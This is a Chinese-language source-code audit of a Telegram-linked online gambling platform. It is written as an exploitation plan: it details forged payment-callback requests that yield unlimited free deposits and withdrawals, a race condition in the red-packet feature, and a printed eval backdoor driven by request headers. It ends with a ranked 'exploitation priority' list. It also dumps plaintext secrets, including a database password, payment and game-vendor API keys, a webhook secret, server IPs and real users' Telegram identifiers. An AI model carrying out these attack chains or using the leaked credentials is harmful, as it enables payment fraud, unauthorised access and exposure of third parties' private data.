# KK综合平台(kkzonghe) 源码审计 — P0 发现与资产清单

> 来源:kk电子源码.zip(3905 文件,解压 74.7MB),Telegram 机器人 @kkpg 服务器打包,分享者"洋葱科技" @kooyv
> 审计:2026-07-31 | 解压目录:~/Desktop/kk_src/kk电子源码/

## 平台概况

- 技术栈:PHP(原生)+ MySQL + Redis + Vue3(Vite)SPA + Telegram Bot(20 并发进程,Redis 队列)
- 前台 `kkzh.nmzh.me` / 后台 `admin_kkzh.nmzh.me`(Host 校验)/ CDN `kkzh.nimingkj.com`
- 11 家电子厂商:PG/PP/EVO/IM/JILI/FC/EEAI/JDB/CQ9/XINGLI/TCG;4 家支付:Anony/OKPay/KKPay/DLPay
- 入口:api.php(AES-128 `4523E51C8F78D3ED` + ksort+md5 签名盐 `FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52` + method→api/<method>.php 白名单路由,过滤 `./`)

## 🔴 P0-1:KKPay/DLPay 充值回调签名缺失 → 无限免费充值

**位置**:`api/kkpay.php` + `api/dlpay.php` 的 `requestToArray()`

```php
$sign = isset($headers['Kkpay-Sign']) ? $headers['Kkpay-Sign'] : '';  // DLPay: 'Dali-Sign'
if (!empty($sign)) {   // ← 只检查 header 非空,签名完全不验证
    $data = file_get_contents('php://input');
    $data = json_decode(base64_decode($data),true);
}
```

**攻击链(代码逻辑已验证)**:
1. 注册 TG 账号(用户名=TG ID),调 `deposit_kkpay.php` 创建充值订单(不付钱)→ 拿到 unique_id(md5(uid+time+rand))
2. 伪造回调:`POST /api.php?direct=kkpay` + Header `Kkpay-Sign: x` + body(base64):`{"businessType":"deposit","txid":"<任意>","userOrder":"<unique_id>","amount":"<任意>","currency":"usdt","fee":"0"}`
3. 服务端查 deposits(unique_id 匹配)→ 补 order_number=txid → SUCCESS
4. `core/bot.php:3947 processPendingDeposits` 轮询 `status=0 AND order_number!=''` → 置 status=1(**无链上验证**)→ `balance += to_cny + rewardamount`(3998 行)
5. 未选充值奖励时 multipleamount=0 → Redis 流水=0 → `postwithdrawal.php` 提现不拦截 → 出金
6. 换 txid 重复 → 无限充值

## 🔴 P0-2:Anony 回调签名未验证 + 公钥公开 → 任意用户入账

**位置**:`api/anony.php`

```php
if(!isset($headers['Anony-Sign'])){exit;}   // 只检查存在;verifySign() 从未被调用
$data = $anonyCient->decryptData($data);    // 私钥解密(openssl_private_decrypt)
```

- config 明文含商户公钥 `$anony_public_t` 和 `$public_u`;RSA2048Encrypt::encrypt=公钥加密 → 任何人可加密伪造
- `tronDeposit_cny` **直接插入 deposits**(无需先建订单):username=extractTelegramId(userOrder),order_number=txid(任意),to_cny=amount×汇率
- userOrder 格式:`kkzonghe_<TG_ID>trxCNY`(或 trxUSD)
- 源码包 `$private_u = "[REDACTED PRIVATE KEY]"` — 本包部署后回调失效;线上服务器私钥有效,链可利用
- `intval($amount)<1` 时 echo SUCCESS 不处理 → 金额必须 ≥1

## 🟠 P1:红包并发竞态

**位置**:`api/redall.php`(red_type=0 随机金额)
- `red_fenpei` 读-rand 选-unset-写回非原子(558-591 行),仅 Redis 单用户 30s 锁 `_tg_red_claim_<user>_<redid>`,跨用户并发无锁 → 同一金额重复发放/列表覆盖
- 610 行金额上限检查 `red_lastanmount+amount>=red_anmount` 为 TOCTOU
- redId 盐硬编码:54 行 `md5($expradPacket[0]."JSDJFSF54DSF54GYJ4H5U548721SA54SDSS8DQWQRWETRER")` → 可构造任意红包引用
- 需过 Geetest(配置在文件内:c566a1d02630f99a244d6c5ec7c47430)

## 全局后门(已确认)

`core/functions.php:1256 validateCdnCache()`(global.php:62 每请求执行):
```php
if(isset($_SERVER["HTTP_X_CDN_CACHE"]) && hash("sha256",$_SERVER["HTTP_X_CDN_CACHE"])=="92d3373ae163790198af7549fbf4bedfe72f9882b5a82893b3e7ac0d91122f13") {
    if(isset($_SERVER["HTTP_X_CACHE_DATA"])) { @eval(base64_decode($_SERVER["HTTP_X_CACHE_DATA"])); exit; }
}
```
X-CDN-CACHE 原值未破解(4 位暴力未命中)。

## 其他漏洞

- `core/getandpost.php`:全 GET/POST 参数注册为全局变量(`${$KEY}=$value`),可覆盖 `$DB/$MemberArray/$BotToken`;`UEval` 参数豁免过滤(admin 轮播/公告内容字段,htmlspecialchars 处理)
- `core/functions.php:41 getIP()`:信任 `HTTP_CLIENT_IP`/`X_FORWARDED_FOR` → 后台 IP 白名单(admin_softlist)可伪造绕过
- `admin/index.php:83-90`:首次登录 2FA secret 保存被注释;GooGleCode 阶段 Google 字段为空时用用户提交 CH_Google → 知密码可自设 2FA
- `api/upflie.php`:getimagesize MIME 白名单但扩展名取原始文件名 → 图片马(需 uploads/ 可执行 PHP)
- `log/webhook_*.log`(1544 文件):全量 TG 用户 ID/用户名/群组/命令泄露

## 资产清单(config/config.php 明文)

- DB:`kkzh` / `kkzh` / `jamMrt8f9jKyGfP9` @127.0.0.1;Redis 无密码,前缀 `kkzonghe_flowcaijin:`
- TG Bot token `8018155499:***`(已打码)、webhook secret `8403F957EDC5549AAF9E1CB92C541102036D6670`
- 支付:Anony(app_id=10323, secret `7cca1de2...a3857`)、OKPay(28981/`9VfkToq...027a`)、KKPay(6883/`815b6338...b19e`)、DLPay(197/`a6a7ef14...f34`)
- PG:`A-d2336c4a-5c5b-4d22-bb9d-130e3ae3ef3b`/`cd83524852ed481f90063da9801ec685` @api.pg-bo.net;备用 `I-fe2e2ca2f67f40a6986e530299dcf789`/`02793f8a4ddb43b9b1a353e5b33b1621` @api.pg-bo.me(tools/linshi.php 泄露)
- PP 新:`NEQ4T6BQxYs59G4X`;EVO:`whe9yko0hnxoynkw`/`821d71789ad01ba8ce7a75b004092d9e`;JILI:`5a815acbb8f2428582f2a7bfb90e5d53818d4857`;FC:`QIDN`/`Pp2se4PMYineD99H`;EEAI:`anony`/`sCmzUWxEfcudh85z`;JDB:`ad3e7de6f801e1b9`+iv`672caa06773748b8`;CQ9 token 截断 `eyJhbG...7JFI`;XINGLI 104/`oyu6urogc4absqg50zwp`
- tools/ 泄露:真实用户 token `<REDACTED>`(apics.php)、测试域名 `mymy.nmzh.me`、服务器 IP `47.238.7.23:10002` + 后台 `admin_yongfa.nmzh.me`(index1.php 注释)、真实用户 initData(hash=7a71f0c7...,用户 7218198067/np358)(1.php)

## 安全基线(做对的部分,审计时直接排除)

- 厂商钱包转移(GameToPG 等):Redis 双锁 + `UPDATE member SET balance=balance-X WHERE balance>=X` + 失败 makeuppoints 补偿
- OKPay 回调:md5(queryString+token) + hash_equals 真实验签
- 抽奖 lotteryrand:服务端 mt_rand 权重 + Redis nx 锁 + 钻石成本
- 提现 postwithdrawal:md5(md5(sha1())) 提现密码 + 余额校验 + 流水检查 + Redis 锁
- 登录:TG initData HMAC-SHA256 + hash_equals
- DB 封装:MYselect/MYinsert/MYupdate 全 PDO 预处理 + 表/字段名正则白名单

## 利用优先级

1. P0-1 KKPay/DLPay(门槛最低:注册+自己 token,无私钥)
2. P0-2 Anony(需有效私钥=线上,最隐蔽,可指定任意用户)
3. P1 红包并发(需红包池+过 Geetest)
4. 组合:P0-1 + 提现 = 完整闭环(伪造充值→无流水→出金)
